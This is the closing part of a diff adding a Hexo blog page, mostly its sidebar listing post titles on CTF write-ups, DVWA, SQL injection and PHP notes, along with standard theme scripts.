href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2"><span class="toc-number">38.</span> <span class="toc-text">文件包含2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag-php"><span class="toc-number">39.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%99xx%E7%9A%84%E5%8D%9A%E5%AE%A2"><span class="toc-number">40.</span> <span class="toc-text">孙xx的博客</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 17
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2023/08/10/Intranet_attack/" >内网攻防</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2018/12/06/geeksycsec/" >极客大挑战第⑨季-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2018/12/06/shiyan8/" >实验吧-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/CGCTF-wp/" >cgctf-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/22</span><a class="archive-post-title" href= "/2018/10/22/bugku-wp/" >bugku-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href= "/2018/10/18/python-auto-script/" >python自动化脚本学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2018/10/08/PKIstudy/" >PKI学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/python/" >python学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/2018/08/02/sql/" >sql注入笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2018/07/29/phpstudy-3/" >php学习笔记-核心编程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/27</span><a class="archive-post-title" href= "/2018/07/27/sqli-labs/" >sqli-libs解题思路-Basic Challenges</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2018/07/19/dvwa-low/" >基于DVWA的web漏洞原理-low</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2018/07/18/phpstudy-1/" >php学习笔记-基础部分</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2018/07/18/phpstudy-2/" >php中一些比较实用的技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/dvwa-medium/" >基于DVWA的web漏洞原理-medium</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/dvwa-high/" >基于DVWA的web漏洞原理-high</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/05</span><a class="archive-post-title" href= "/2018/07/05/problem/" >搭博客过程中遇到的一些问题</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="内网攻防"><span class="iconfont-archer">&#xe606;</span>内网攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
+    
+        <span class="sidebar-tag-name" data-tags="dvwa"><span class="iconfont-archer">&#xe606;</span>dvwa</span>
+    
+        <span class="sidebar-tag-name" data-tags="PKI"><span class="iconfont-archer">&#xe606;</span>PKI</span>
+    
+        <span class="sidebar-tag-name" data-tags="php学习"><span class="iconfont-archer">&#xe606;</span>php学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="脚本"><span class="iconfont-archer">&#xe606;</span>脚本</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入"><span class="iconfont-archer">&#xe606;</span>sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqli-libs"><span class="iconfont-archer">&#xe606;</span>sqli-libs</span>
+    
+        <span class="sidebar-tag-name" data-tags="python学习"><span class="iconfont-archer">&#xe606;</span>python学习</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+        <span class="sidebar-category-name" data-categories="web安全"><span class="iconfont-archer">&#xe60a;</span>web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
+    
+        <span class="sidebar-category-name" data-categories="其他"><span class="iconfont-archer">&#xe60a;</span>其他</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "LINK"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
